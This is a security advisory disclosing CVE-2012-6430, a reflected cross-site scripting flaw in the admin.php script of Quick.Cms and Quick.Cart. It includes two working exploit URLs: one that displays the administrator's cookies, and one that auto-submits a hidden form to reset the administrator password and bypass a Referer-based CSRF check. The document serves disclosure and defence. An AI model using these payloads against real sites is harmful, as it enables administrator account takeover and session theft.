Advisory Details:

High-Tech Bridge Security Research Lab discovered XSS vulnerability in Quick.Cms and Quick.Cart - two products developed by OpenSolution team, which can be exploited to perform cross-site scripting attacks.


1. Cross-Site Scripting (XSS) vulnerability in Quick.Cms and Quick.Cart: CVE-2012-6430

The vulnerability exists due to insufficient filtration of user-supplied data in URI in the "admin.php" script. A remote attacker can trick a logged-in administrator to open a specially crafted link and execute arbitrary HTML and script code in browser in context of the vulnerable website.

The exploitation example below uses the "alert()" JavaScript function to display administrator&#039;s cookies: 


http://[host]/admin.php/&#039;)"></select><script>alert(document.cookie);</script>/


Nevertheless, a remote attacker can create an exploit for this vulnerability to bypass application&#039;s CSRF protection mechanism based on the HTTP Referer header and get access to privileged functions of the application. To do so he have to trick a logged-in administrator to click on a malicious link with XSS exploit.

PoC (Prof-of-Concept) code below will change administrator&#039;s password to "password":

http://[host]/admin.php/&#039;)"></select><form action="http://[host]/admin.php%3fp=tools-config" method="post"><input type="hidden" name="login" value="login"><input type="hidden" name="pass" value="password"><input type="submit" id="btn" name="sOption"></form><script>document.getElementById(&#039;btn&#039;).click();</script>/

Successful exploitation of the vulnerability requires that Apache directive "AcceptPathInfo" is set to "on" or "default" (default value is "default").
